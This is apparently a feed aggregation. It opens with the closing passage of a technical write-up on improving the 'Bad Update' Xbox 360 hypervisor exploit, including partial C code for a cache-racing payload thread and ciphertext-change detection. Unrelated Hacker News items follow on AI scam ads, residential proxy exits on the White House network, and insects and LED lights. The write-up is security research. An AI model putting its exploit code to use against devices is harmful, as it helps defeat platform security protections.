DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)

{

    ...

    // Get the cipher text at the location we want to overwrite and at an offset that is > the size of block 14. This allows

    // us to determine when we win the race on block 14 (smallest block in the file) vs any other block.

    DWORD* pCipherTextPtr1 = (DWORD*)(0xA0030000 + HV_SEG3_OVERWRITE_OFFSET);

    DWORD* pCipherTextPtr2 = (DWORD*)(0xA0030000 + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET) + BLOCK_14_SIZE + 0x80);

    DWORD cipherValue1 = *pCipherTextPtr1;

    DWORD cipherValue2 = *pCipherTextPtr2;

    // Loop and hammer the payload until we hopefully get code exec.

    while (true)

    {

        ...

        // Execute the payload.

        // Status is 0xc8000012 on miss, and 0xc8000006 on hit.

        DWORD result = HvxKeysExecute(pArgs->PayloadPhys, pArgs->PayloadSize, pArgs->UpdateDataPhys, pArgs->UpdateDataSize, NULL, NULL);

        if (result != 0xc8000012)

            DbgPrint("XKE payload returned status %#x\n", result);

        // Flush cache on the cipher text pointers.

        __dcbf(0, pCipherTextPtr1);

        // Check if we got a block overwrite and if it appears to be block 14.

        DWORD test1 = *pCipherTextPtr1;

        if (cipherValue1 != test1)

        {

            ...

            __dcbf(0, pCipherTextPtr2);

            // We got a block overwrite, check if it was block 14.

            DWORD test2 = *pCipherTextPtr2;

            if (cipherValue2 == test2)

            {

                DbgPrint("Block 14 overwrite hit!\n");

                ...

            }

            else

            {

                DbgPrint("Race hit: 0x%08x\n", test1);

            }

            // Save the latest block hit values.

            cipherValue1 = test1;

            cipherValue2 = test2;

        }

    }

}

Above is the original implementation for the exploit thread that ran the XKE payload and checked for ciphertext changes in the last segment of the hypervisor. The lines relevant to ciphertext observation have been highlighted. Because the same thread is both running the XKE payload and checking for ciphertext changes it can only detect if the ciphertext has changed at all and not how many times it changed. Put more simply: I could only infer if one of the compressed blocks was written to memory, but not how many blocks were written. With that in mind lets run through two scenarios that could happen when running an iteration of the XKE payload while attempting to get compressed block 14 written to memory.

Missing Successful Writes

While running the XKE payload the race attack is successful on some block N such that N < 14 (0x8000 bytes get written) and successful on block 14 (less than 0x8000 bytes). Upon returning from HvxKeysExecute we observe the ciphertext for two locations in the target write zone and see that the ciphertext has changed in both locations. We can’t infer that block 14 was written after block N because we don’t have the ability to observe how many times the ciphertext changed. Thus we consider this a failed iteration even though it was successful.

False Positive Write

Assume we have just executed an iteration of the XKE payload that exhibits the missed successful write behavior for some block N and block 14. The last segment of the hypervisor now contains the data for block 14 and the tail data for some block N. We run another iteration of the XKE payload and this time only block N is written. When we observe the ciphertext changes for this iteration we’ll see the ciphertext at the first location has change but the ciphertext at the second location hasn’t because it already contained the ciphertext for the tail data of block N from the previous iteration.

This gets detected as a write for block 14 and the exploit will try to execute some hypervisor code assuming the instruction pattern for the target syscall has been changed to the write-what-where pattern found in bock 14. However, the instruction pattern is actually random instructions found in block N and will cause the console to crash.

The New Detection Method

Now that the cache flushing primitive was significantly improved it was possible to observe the ciphertext changes for each block of compressed data that was successfully written to the target region of hypervisor memory. The solution I came up with for the detecting if block 14 was written to memory was quite simple: I created a new thread that continuously watched the ciphertext for changes and counted how many changes were observed.

If the counter reached 15 once the XKE payload was done executing then we know all 15 blocks were written to memory and thus the last block had to have been written. If we observed anything less we simply consider it a failed iteration and try again. Here’s the code for the new ciphertext detection thread:

void CipherTextObservationThreadProc(THREAD_ARGS* pArgs)

{

    // Setup our hypervisor cipher text watch pointer.

    volatile DWORD* pCipherTextPtr = (volatile DWORD*)(0xA0030000 + HV_SEG3_OVERWRITE_OFFSET);

    // Flush cache and fetch the starting value.

    __dcbf(0, (const void*)pCipherTextPtr);

    DWORD lastCipherTextValue = *pCipherTextPtr;

    volatile DWORD* pBlockCounter = (volatile DWORD*)&pArgs->CipherTextBlockCounter;

    // Loop until we're told to exit.

    while (pArgs->bRunCacheThrashing != FALSE)

    {

        for (int i = 0; i < 10000; i++)

        {

            // Flush any cached data for the cipher text observation pointer.

            __dcbf(0, (const void*)pCipherTextPtr);

            // Fetch the cipher text for the area of the hypervisor we want to overwrite and check if another block has been written.

            DWORD test = *pCipherTextPtr;

            if (test != lastCipherTextValue)

            {

                lastCipherTextValue = test;

                (*pBlockCounter)++;

            }

            // Once we observe 15 different cipher text values bail out.

            if (*pBlockCounter == 15)

            {

                goto Exit;

            }

        }

    }

Exit:

    ExTerminateThread(0);

}

Too Much Pressure

The new ciphertext observation function worked great but there was a new problem it introduced. Due to the amount of pressure I was putting on CPU cache the console would crash about 30% of the time when executing the XKE payload. When the XKE payload runs it takes the compressed update data buffer and does an in-place relocation to move it from unprotected memory to protected memory so it can’t be tampered with asynchronously. After the XKE payload runs its main logic it’ll do another in-place relocation to move the update data back to unprotected memory before returning.

After modifying the XKE payload and inserting a bunch of printf calls I was able to determine that the console would crash in a function I called HvpRelocateProtectedToPhysical when trying to move the update data from protected memory back to unprotected memory. The function works by looping over a region of memory and for each CPU cache line worth of data (128 bytes) it will:

  1. Read the entire cache line into CPU registers using the protected source address.
  2. Invalidate both data and instruction caches for the source address, zero the cache line for the destination address.
  3. Write the data back to memory using the unprotected destination address.

Here’s the disassembly for the inner loop of the HvpRelocateProtectedToPhysical function:

In the modified version of the XKE payload I added a bunch of printf calls in a re-implemented version of this function so I could monitor were it would crash:

After running a few dozen iterations I was able to determine that the CPU would crash when trying to write data back to the unprotected destination address on the line highlighted in red. As I mentioned earlier in the improved cache flushing section I made some modifications to Máté’s original implementation to put more pressure on cache which made the new ciphertext observation method more reliable.

I don’t know exactly what’s happening here that causes the CPU to crash when trying to write data back to the unprotected destination address. Perhaps one of the cache invalidation instructions didn’t fully complete before the store instruction was executed, or maybe there’s some edge case with respect to the custom memory pathways when the CPU is starved for cache. Regardless, I did manage to find a way to work around this issue.

The New Detection Method v2

Since the crash happens after we would have been able to observe all 15 blocks of data being written to hypervisor memory the solution I came up with was to immediately stop the cache flushing thread and drop the L2 locks once the ciphertext change counter hits 15. This reduces the pressure on CPU cache before the call to HvpRelocateProtectedToPhysical which prevents it from crashing. Here’s the updated implementation of the ciphertext observation thread logic:

1

2

3

4

6

16

18

19

20

21

56

void CipherTextObservationThreadProc(THREAD_ARGS* pArgs)

{

    // Lock half of the available L2 cache and pathways to put pressure on the CPU. This causes data in L2 cache to

    // age out more quickly and improves cipher text detection rate.

    BYTE* pL2LockBuffer = LockAndThrashL2();

    // Setup our hypervisor cipher text watch pointer.

    volatile DWORD* pCipherTextPtr = (volatile DWORD*)(0xA0030000 + HV_SEG3_OVERWRITE_OFFSET);

    // Flush cache and fetch the starting value.

    __dcbf(0, (const void*)pCipherTextPtr);

    DWORD lastCipherTextValue = *pCipherTextPtr;

    volatile DWORD* pBlockCounter = (volatile DWORD*)&pArgs->CipherTextBlockCounter;

    // Loop until we're told to exit.

    while (pArgs->bRunCacheThrashing != FALSE)

    {

        for (int i = 0; i < 10000; i++)

        {

            // Flush any cached data for the cipher text observation pointer.

            __dcbf(0, (const void*)pCipherTextPtr);

            // Fetch the cipher text for the area of the hypervisor we want to overwrite and check if another block has been written.

            DWORD test = *pCipherTextPtr;

            if (test != lastCipherTextValue)

            {

                lastCipherTextValue = test;

                (*pBlockCounter)++;

            }

            // Once we observe 15 different cipher text values stop thrashing cache immediately.

            if (*pBlockCounter == 15)

            {

                // Unlock the L2 cache and free the scratch buffer.

                UnlockL2(pL2LockBuffer);

                pL2LockBuffer = NULL;

                // Flag to stop thrashing cache.

                pArgs->bRunCacheThrashing = FALSE;

                goto Exit;

            }

        }

    }

Exit:

    if (pL2LockBuffer != NULL)

    {

        // Unlock the L2 cache and free the scratch buffer.

        UnlockL2(pL2LockBuffer);

    }

    // We must call ExTerminateThread since we don't use the normal thread startup routine.

    ExTerminateThread(0);

}

I moved the L2 cache locks into the ciphertext observation thread which we can see on line 5. Once we observe all 15 blocks of data have been written to memory we drop the L2 locks on line 36, and signal to the cache flushing thread to immediately terminate on line 40.

There’s still an edge case where we don’t observe all 15 blocks being written and thus won’t be able to reduce pressure on CPU cache before the call to HvpRelocateProtectedToPhysical. But this didn’t seem to matter. With all the improvements the exploit is usually successful in the first run of the XKE payload and at worst it may take 2-5 iterations, but I didn’t encounter any crashes when testing. It’s still possible it could happen but I think it’s very rare it does.

Conclusion

So there you have it, thanks to all the improvements from ihatecompvir, InvoxiPlayGames, and Máté the Bad Update exploit is now instantaneous and has nearly 100% success rate, and you only need to copy a few files to a USB stick to hack your console. When I released the original PoC I made some statements like “I don’t think this can be optimized any further” mostly to avoid endless comments from non-technical people spit balling random useless ideas. The truth is I always thought it could be optimized further but I didn’t expect it would ever reach the point it’s at now.

I think the biggest thing I learned here is that I should have taken a break after I completed the first iteration of Bad Update and came back with a clear mind to try and refine it. Having just found one of the only two bugs in the Xbox 360 hypervisor I put a lot of pressure on myself to get this exploit working at all. It took a lot of effort and sleepless days to pull it off and in the end I got tunnel vision chasing issues that didn’t really matter which distracted me from the real issues at hand. Had I taken a break after the initial PoC and came back a few weeks later I probably could have had something more refined for the initial release even if it wasn’t as refined as it is now.

Any ways, that does it for part 3. You can find the source code for the Bad Update improvements on my GitHub. Part 4 which covers the Peer Pressure exploit will be out soon so stay tuned for that!

item.title: Everything is an AI scam now (145 pts)
item.description:
URL: https://www.davidralphlewis.co.uk/posts/everything-is-an-ai-scam-now/, See on Hacker News

Whenever you watch a video on YouTube now, you will likely get an advert for a scammy product. In the past few weeks I've seen:

  • A Tai Chi training program that promises to get you ripped like someone on steroids a superhero in 20 days. (Tai chi? Really?)
  • Glasses that can adapt to any prescription (not how glasses work) and are also sunglasses sometimes
  • A small USB stick that offers free Internet with no limits.
  • An air con unit the size of a book that can cool any room - any room! - in 90 seconds.
  • Endless mobile games that probably don't exist.

This is leaking into other parts of the internet as well with adverts on the side increasingly looking like chum buckets.

What annoys me is how little verification there is for any of this. It's like we have collectively decided that AI is inevitable, and the cost is the breakdown of truth itself. Scams used to be a bad thing and there used to be measures in place to stop them. Now they've escaped the spam filter and have run wild. As long as someone can create an unconvincing advert and pay, platforms will take anything.

So we have all this poorly made junk which breaks the rules of reality, so what? Most people are aware its fake. The problem is the scammers only need to get through to a very small percentage of people to make their money back.

It's not just adverts. I have my email in my footer [1] and tend to get a lot of spam. However, the quality of the spam has gotten more sophisticated. Take this email I got the other day.

In a world of noise and uncertainty, blackout poetry does something quietly extraordinary: it finds meaning hidden within the chaos, revealing light where none seemed to exist. Our Voices in the Chaos does exactly that, drawing readers into the madness of the world and returning them with something they did not expect to find: hope. A perfect 5.0 rating from your earliest reader is a promising beginning. The question worth considering is how many more poetry lovers could discover this collection.

On first glance, this sounds pretty good! As a pitch it's clear they have engaged with reading the book... except of course they haven't. Here's how I describe the book on this site:

In these blackout poems, you will be drawn into the maddening chaos of the world and find your own voices singing within. It deals with ghosts, anxiety and complete societal collapse, but with glimmers of hope strewn throughout like the stars in the empty night sky.

Someone has clearly pointed chatGPT at the page and said create a pitch to advertise this book. It even uses some of the same phrases! Even worse, I give away Our Voices in the Chaos as a free downloadable pdf, so I'm not looking to market it or get a "perfect 5.0" rating. This email is clearly phishing for information or money. It's the new version of the Nigerian Prince scam, only more tailored to vulnerable writers and creators.

I just delete these emails now. But the scammers only need to get a few people hooked and with these emails becoming more personal and reflecting back the author's words at them, the rate of people taking them up is only going to increase.

I'm not sure what we can do about this. I guess verifying a product exists before accepting adverts for it would be a good start, but I don't expect the huge internet platforms to turn the money tap off. We need more vigilance and more awareness, but it's exhausting having to constantly evaluate things for truth.

  1. Come say hi if you're a human! ↩︎

item.title: Residential Proxies Detected on White House Network (1208 pts)
item.description:
URL: https://layer3intel.com/blog/residential-proxies-white-house-network, See on Hacker News

Our Residential Proxy Observatory, launched earlier this week, is a first-of-its-kind interface that gives researchers a global view of residential proxy and anonymized internet activity.

While our team was looking through it, we noticed residential proxy exit activity on AS2650. AS2650 is registered to the Executive Office of the President, the federal agency that hosts the White House network. Residential proxy services sell access to everyday devices, letting customers send traffic through them so it appears to come from that device's network.

What we observed

From October 5 to November 3:

  • Our residential proxy enumeration pipeline exited through the White House network 236 separate times.
  • Those exits came from 6 addresses, on 26 of the 30 days.
  • 28 separate residential proxy services were able to exit through this network.

To make sure this was not a fluke, we checked these addresses against other residential proxy detection services, such as Spur and Synthient. Their public IP context pages independently identify these addresses as residential proxy exits.

This is public access. Anybody can obtain it by signing up to a public residential proxy service, paying a few dollars and sending requests through it. We did not selectively target this network or try to make our probes exit from it. We caught this by chance, simply by requesting global rotating access through these services.

Why this is concerning

Most of the activity happens in the evening, Eastern time: about half of it falls between 5 p.m. and midnight, and almost none happens in the early morning. That pattern suggests a person rather than a public guest Wi-Fi network: someone regularly on the White House network late into the evening, whose device is infected with a proxy SDK. Our data shows the exits, not the device or the person behind them.

Past research has shown that poorly secured proxy SDKs can allow internal network access and lateral movement. This is how past botnets have spread. In A Broken System Fueling Botnets, the researchers at Synthient documented how the Kimwolf botnet reached at least 2 million devices, mostly Android devices with an exposed ADB service, through residential proxy networks. If an SDK on this network has the same kind of flaw, anyone buying proxy access could use it to reach internal systems.

No place is too remote

The White House is not the only surprise in the observatory. Residential proxies also reach some of the most isolated places on the planet.

Saint Helena, Ascension and Tristan da Cunha is the South Atlantic territory that includes the most remote inhabited island in the world. We recorded 413 addresses and more than 32,000 observations there, split between Starlink and the island's local internet provider, Sure Saint Helena.

We also recorded three observations from Antarctica. All of them come from a Cloudflare WARP address that points to McMurdo Station.

Other remote places with activity:

  • Pitcairn: 1 Starlink address, 1 observation.
  • Norfolk Island: 1 Norfolk Telecom address, 4 observations.
  • Svalbard: 1 Starlink address in Longyearbyen, 3 observations.
  • Also seen: the Falklands (388 addresses), the Chagos Islands (43), Tokelau (21) and South Georgia (7).

Residential proxies have infected every corner of the world, and it looks like there is no place they cannot reach. Layer3 Intel tracks residential proxy and anonymization infrastructure worldwide. Even when the proxies hide in networks on the farthest corners of the planet, we can still observe them, leaving threat actors no place to hide.

For relevant agencies: We have backed up the raw logs of the recorded activity and are willing to share them. You can request them through our contact page.

item.title: Insects don't swarm at LED lights (299 pts)
item.description:
URL: https://www.birdsoutsidemywindow.org/2026/11/03/insects-dont-swarm-at-led-lights/, See on Hacker News

3 November 2026

Remember when you used to encounter swarms of insects around outdoor electric lights? Their well known attraction to outdoor lights is used by entomologists and moth lovers to conduct insect surveys. All you need is a light and a white sheet to see who’s flying at night.

Nowadays, if you want to attract insects, you have to be picky about the light you use. As everyone changes over to LED lights, we see the color difference but we can’t see the crucial difference in insect attraction between incandescent and LED.

Our guide Roland Rumm on the WINGS Veracruz trip explained what happens with insects in the switch to LED lights. His family has an outdoor dining space that is well lit with artificial light. As a child he loved to watch the geckos climb to the lights and eat the insects. (This gecko can change to a bland gray color when he needs to.)

In recent years the family changed over to LED lights and the geckos disappeared. Were the geckos gone? No. But far fewer insects were attracted to the LED lights so the geckos had no reason to show up.

In 2024 the BBC wrote about Why insects are drawn to artificial light at night:

Flying insects use moonlight to navigate. Since the moon is always above them, they orient themselves so that the light shines on their backs. That’s how they stay upright in flight.

Moonlight contains ultraviolet (UV) and infrared wavelengths because it is merely reflected sunlight. Insects cue on UV, believing it to be the moon. When artificial lights transmit UV they look like moonlight so insects orient their backs to it. Consequently they circle the light and even flip upside down when the artificial light is pointing up to the sky!

Incandescent lights transmit UV but LEDs do not. Insects are far less attracted to LED.

In 2016 scientists at the University of Bristol, UK ran experiments to compare insect attraction to four types of light: Incandescent (tungsten filament), Compact fluorescent, “Cool-white” LED and “Warm-white” LED.

We conducted field experiments to compare the relative attractiveness of four commercially available “domestic” lights, one traditional (tungsten filament incandescent) and three modern (compact fluorescent, “cool white” LED and “warm white” LED), to aerial insects, particularly Diptera. We found that LEDs attracted significantly fewer insects than other light sources, but found no significant difference in attraction between the “cool” and “warm white” LEDs. Fewer flies were attracted to LEDs than alternate light sources, including fewer Culicoides midges (Diptera: Ceratopogonidae). Use of LEDs has the potential to mitigate disturbances to wildlife and occurrences of insect?borne diseases relative to competing lighting technologies.

— Experimentally comparing the attractiveness of domestic lights to insects: Do LEDs attract fewer insects than conventional light types?

Here’s what they found. NOTES: CFL = Compact fluorescent, FIL = incandescent (the old lightbulb), LEDC = LED cool white, LEDW = LED warm white light.

Typically LEDs do not emit UV light and are more energy efficient than traditional technologies. Electrical energy is converted almost entirely into electromagnetic (EM) radiation within the range of the visible light spectrum (400–700 nm) and therefore not wasted on producing wavelengths of light invisible to the human eye, that is, UV and infrared (IR). Thus, LEDs are less attractive to many insects than lights which emit UV light. 

— Experimentally comparing the attractiveness of domestic lights to insects: Do LEDs attract fewer insects than conventional light types?

So that’s why there are very few bugs circling LED lights at night.

This trait of LEDs is a good thing because UV artificial light at night distracts insects so much that it’s considered a major reason why insect populations have declined. See: The impact of artificial light at night on nocturnal insects: A review and synthesis.
